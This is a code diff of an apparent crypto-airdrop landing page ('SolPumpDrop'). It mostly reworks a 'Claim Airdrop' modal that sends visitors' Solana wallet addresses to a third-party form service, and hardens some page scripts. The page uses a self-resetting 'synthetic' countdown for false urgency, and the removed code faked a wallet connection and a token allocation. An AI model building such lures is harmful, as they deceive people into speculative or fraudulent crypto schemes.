@@ -580,11 +580,6 @@
             max-width: 400px; width: 90%;
             padding: 30px; text-align: center;
         }
-        .modal-body i.spinner {
-            font-size: 3rem; color: var(--sol-green);
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
 
         /* Animations */
         @keyframes pulse {
@@ -801,73 +796,71 @@
             <div>&copy; 2026 SolPumpDrop Protocols. All Rights Reserved.</div>
             <div>Powered by high-velocity Solana Architecture.</div>
         </div>
-    </footer>
-<div class="glass-card modal-body">
+    </footer >
 
-    <h3 style="font-family: var(--font-heading); margin-bottom: 15px;">
-        Claim Airdrop
-    </h3>
-
-    <form action="https://api.web3forms.com/submit" method="POST">
-
-        <input type="hidden" name="access_key" value="5fd189dd-7afe-402a-919e-195e31c76c7c">
-
-        <input type="text"
-               name="wallet"
-               placeholder="Paste your Solana wallet address"
-               required
-               style="width:100%;padding:12px;margin:10px 0;border-radius:8px;border:none;">
-
-        <button class="btn btn-primary" type="submit">
-            Submit Airdrop
-        </button>
-
-    </form>
-
-</div>
-  
+    <div class="modal" id="walletModal" onclick="closeModal(event)">
+        <div class="glass-card modal-body" onclick="event.stopPropagation()">
+            <h3 style="font-family: var(--font-heading); margin-bottom: 15px;">
+                Claim Airdrop
+            </h3>
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="5fd189dd-7afe-402a-919e-195e31c76c7c">
+                <input type="text"
+                       name="wallet"
+                       placeholder="Paste your Solana wallet address"
+                       required
+                       style="width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none; background: rgba(255,255,255,0.1); color: #fff;">
+                <button class="btn btn-primary" type="submit" style="width: 100%; justify-content: center; margin-top: 10px;">
+                    Submit Airdrop
+                </button>
+            </form>
+        </div>
     </div>
 
     <script>
         // Decorative Animated Particle Setup
         const pContainer = document.getElementById('particle-container');
-        for (let i = 0; i < 40; i++) {
-            const particle = document.createElement('div');
-            particle.style.position = 'absolute';
-            particle.style.backgroundColor = Math.random() > 0.5 ? '#14F195' : '#9945FF';
-            particle.style.width = `${Math.random() * 4 + 2}px`;
-            particle.style.height = particle.style.width;
-            particle.style.borderRadius = '50%';
-            particle.style.opacity = Math.random() * 0.4 + 0.1;
-            particle.style.top = `${Math.random() * 100}%`;
-            particle.style.left = `${Math.random() * 100}%`;
-            particle.style.transform = `translateY(0px)`;
-            
-            // Basic Keyframe Free Simulation Line
-            particle.animate([
-                { transform: 'translateY(0px) translateX(0px)' },
-                { transform: `translateY(-${Math.random() * 80 + 20}px) translateX(${Math.random() * 40 - 20}px)` }
-            ], {
-                duration: Math.random() * 4000 + 3000,
-                iterations: Infinity,
-                direction: 'alternate',
-                easing: 'ease-in-out'
-            });
-            pContainer.appendChild(particle);
+        if (pContainer) {
+            for (let i = 0; i < 40; i++) {
+                const particle = document.createElement('div');
+                particle.style.position = 'absolute';
+                particle.style.backgroundColor = Math.random() > 0.5 ? '#14F195' : '#9945FF';
+                particle.style.width = `${Math.random() * 4 + 2}px`;
+                particle.style.height = particle.style.width;
+                particle.style.borderRadius = '50%';
+                particle.style.opacity = Math.random() * 0.4 + 0.1;
+                particle.style.top = `${Math.random() * 100}%`;
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.transform = `translateY(0px)`;
+                
+                particle.animate([
+                    { transform: 'translateY(0px) translateX(0px)' },
+                    { transform: `translateY(-${Math.random() * 80 + 20}px) translateX(${Math.random() * 40 - 20}px)` }
+                ], {
+                    duration: Math.random() * 4000 + 3000,
+                    iterations: Infinity,
+                    direction: 'alternate',
+                    easing: 'ease-in-out'
+                });
+                pContainer.appendChild(particle);
+            }
         }
 
         // Animated Sequential Tokenomics Bar Loading
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if(entry.isIntersecting) {
-                    const bars = entry.target.querySelectorAll('.bar-fill');
-                    bars.forEach(bar => {
-                        bar.style.width = bar.getAttribute('data-width');
-                    });
-                }
-            });
-        }, { threshold: 0.2 });
-        observer.observe(document.querySelector('.tokenomics'));
+        const tokenomicsSection = document.querySelector('.tokenomics');
+        if (tokenomicsSection) {
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if(entry.isIntersecting) {
+                        const bars = entry.target.querySelectorAll('.bar-fill');
+                        bars.forEach(bar => {
+                            bar.style.width = bar.getAttribute('data-width');
+                        });
+                    }
+                });
+            }, { threshold: 0.2 });
+            observer.observe(tokenomicsSection);
+        }
 
         // Elegant Accordion Mechanism
         document.querySelectorAll('.faq-trigger').forEach(trigger => {
@@ -878,10 +871,11 @@
                 
                 document.querySelectorAll('.faq-item').forEach(i => {
                     i.classList.remove('active');
-                    i.querySelector('.faq-content').style.maxHeight = null;
+                    const c = i.querySelector('.faq-content');
+                    if (c) c.style.maxHeight = null;
                 });
 
-                if (!isActive) {
+                if (!isActive && content) {
                     item.classList.add('active');
                     content.style.maxHeight = content.scrollHeight + "px";
                 }
@@ -891,27 +885,31 @@
         // Synthetic Clock Countdown Controller
         let duration = 24 * 60 * 60; 
         const timerDisplay = document.getElementById('countdown');
-        setInterval(() => {
-            duration--;
-            if (duration <= 0) duration = 24 * 60 * 60;
-            const hrs = String(Math.floor(duration / 3600)).padStart(2, '0');
-            const mins = String(Math.floor((duration % 3600) / 60)).padStart(2, '0');
-            const secs = String(duration % 60).padStart(2, '0');
-            timerDisplay.textContent = `${hrs}h ${mins}m ${secs}s`;
-        }, 1000);
+        if (timerDisplay) {
+            setInterval(() => {
+                duration--;
+                if (duration <= 0) duration = 24 * 60 * 60;
+                const hrs = String(Math.floor(duration / 3600)).padStart(2, '0');
+                const mins = String(Math.floor((duration % 3600) / 60)).padStart(2, '0');
+                const secs = String(duration % 60).padStart(2, '0');
+                timerDisplay.textContent = `${hrs}h ${mins}m ${secs}s`;
+            }, 1000);
+        }
 
-        // Simulated Web3 Wallet Handshake Routine
+        // Corrected Connect Wallet Popup Logic
         function connectWallet() {
-    document.getElementById('walletModal').classList.add('active');
-                                                         }
-            const m = document.getElementById('walletModal');
-            m.classList.add('active');
-            setTimeout(() => {
-                m.classList.remove('active');
-                const btn = document.getElementById('walletBtn');
-                btn.innerHTML = `<i class="fa-solid fa-circle-check" style="color: var(--sol-green)"></i> sol...4x9f`;
-                alert('Wallet Simulated Successfully! Eligible Allocation Found: 7,500 $PUMPDROP');
-            }, 1800);
+            const modal = document.getElementById('walletModal');
+            if (modal) {
+                modal.classList.add('active');
+            }
+        }
+
+        // Function to close modal safely when clicking backdrop
+        function closeModal(event) {
+            const modal = document.getElementById('walletModal');
+            if (modal) {
+                modal.classList.remove('active');
+            }
         }
     </script>
 </body>
